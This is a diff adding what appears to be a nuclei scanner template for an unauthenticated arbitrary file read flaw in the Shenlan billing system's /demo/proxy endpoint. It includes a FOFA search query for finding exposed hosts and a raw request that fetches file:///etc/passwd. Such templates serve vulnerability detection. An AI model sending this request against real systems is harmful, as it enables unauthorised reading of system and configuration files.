@@ -1,0 +1,36 @@
+id: shenlan-proxy-File-reading
+
+info:
+  tags: shenlan-proxy-File-reading
+  name: 深澜计费管理系统 proxy 任意文件读取漏洞
+  author: xc
+  severity: high
+  description: |-
+    fofa: body="/js/lib/slimscroll.js"
+     深澜计费管理系统 /demo/proxy接口处存在任意文件读取漏洞，未经身份验证的攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+
+
+
+http:
+  - raw:
+      - |
+        GET /demo/proxy?url=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:'
+          - '/bin/bash'
+        condition: and
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
